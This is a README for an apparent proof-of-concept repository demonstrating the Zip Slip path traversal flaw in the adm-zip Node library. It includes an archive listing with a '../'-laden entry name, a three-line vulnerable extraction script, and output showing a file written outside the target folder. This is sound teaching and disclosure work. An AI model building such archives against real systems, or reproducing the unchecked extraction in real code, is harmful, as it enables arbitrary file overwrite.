# zip-slip poc

This repo demonstrates the Zip Slip vulnerability using very few lines of code.  


## Exploit File

Inside the zipped folder we have two files, one is just named `good.txt` and the other has a ridiculous path traversal in its name.

```
Listing archive: zip-slip.zip

--
Path = zip-slip.zip
Type = zip
Physical Size = 545

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2018-04-15 13:04:29 .....           19           19  good.txt
2018-04-15 22:04:42 .....           20           20  ../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../tmp/evil.txt
------------------- ----- ------------ ------------  ------------------------
2018-04-15 22:04:42                 39           39  2 files

```


## How It Works

You can perform the exploit by running the application using the following commands:

```
npm install
node index.js
```

Inside of `index.js` there are only three lines of code (shown below). The sole purpose of this application is doing is taking the `zip-slip.zip` and extracting the files to the folder `/tmp/safe`. In fact, after you run the `node index.js` command, the application has been run and the exploit was executed.

```
var AdmZip = require('adm-zip');
var zip = new AdmZip("./zip-slip.zip");
zip.extractAllTo("/tmp/safe");
```

When extracting the `good.txt` file it is simply extracted to the `/tmp/safe` directory. However, when extracting the `evil.txt` the path traversal in the name actually extracts it _outside of the `/tmp/safe` directory!_


## Testing the Exploit

After running the application above, verifying it worked is simple.

```
$ ls -al /tmp/*
-rw-rw-rw-  1 user        wheel  20 Nov 14 00:16 /tmp/evil.txt

/tmp/safe:
total 8
drwxr-xr-x  3 user        wheel   96 Nov 14 00:16 .
drwxrwxrwt  6 root        wheel  192 Nov 14 00:16 ..
-rw-rw-rw-  1 user        wheel   19 Nov 14 00:16 good.txt
```
